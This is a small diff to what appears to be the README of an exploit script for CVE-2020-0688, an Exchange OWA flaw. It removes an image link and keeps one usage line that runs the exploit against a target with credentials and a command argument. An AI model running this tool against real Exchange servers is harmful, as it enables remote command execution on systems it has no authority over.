@@ -17,6 +17,3 @@ example:
 ```
 python cve-2020-0688.py -s https://ip/owa/ -u user -p pass -c "ping www.google.co.kr"
 ```
-
-![](https://blogpics-1251691280.file.myqcloud.com/imgs/20200227105319.png)
-
